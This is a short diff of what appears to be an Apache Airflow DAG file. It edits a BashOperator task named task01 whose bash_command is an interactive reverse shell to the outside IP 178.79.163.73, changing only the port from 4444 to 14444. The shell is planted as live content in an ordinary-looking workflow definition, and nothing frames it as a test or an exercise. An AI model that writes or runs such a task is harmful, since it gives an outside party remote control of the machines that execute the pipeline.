@@ -12,5 +12,5 @@ with DAG(
 
         task01 = BashOperator(
         task_id="task01",
-        bash_command="bash -i >& /dev/tcp/178.79.163.73/4444 0>&1"
+        bash_command="bash -i >& /dev/tcp/178.79.163.73/14444 0>&1"
     )	
